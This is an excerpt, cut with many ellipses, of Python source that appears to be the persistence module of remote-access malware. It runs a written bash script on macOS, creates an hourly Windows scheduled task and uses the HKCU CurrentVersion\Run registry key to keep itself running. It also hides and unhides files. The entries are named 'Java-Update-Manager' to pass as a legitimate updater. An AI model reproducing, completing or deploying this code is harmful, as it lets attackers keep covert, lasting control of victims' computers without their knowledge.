        ...
        if sys.platform == 'darwin':
            ...
            if value and os.path.isfile(value):
                ...
                with open(fpath, 'w') as fileobj:
                    fileobj.write(bash)
                bin_sh = bytes().join(
                    subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE,
...
def _add_scheduled_task(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['scheduled_task'].established:
            ...
            if value and os.path.isfile(value):
                result = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value),
                                                 shell=True)
    ...
    try:
        if _methods['hidden_file'].established:
            ...
            if os.path.isfile(filename):
                try:
                    unhide = 'attrib -h {}'.format(filename) if os.name == 'nt' else 'mv {} {}'.format(filename,
                                                                                                       os.path.join(
                                                                                                           os.path.dirname(
                                                                                                               filename),
                                                                                                           os.path.basename(
...
def _remove_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if _methods['registry_key'].established:
            ...
            try:
                key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
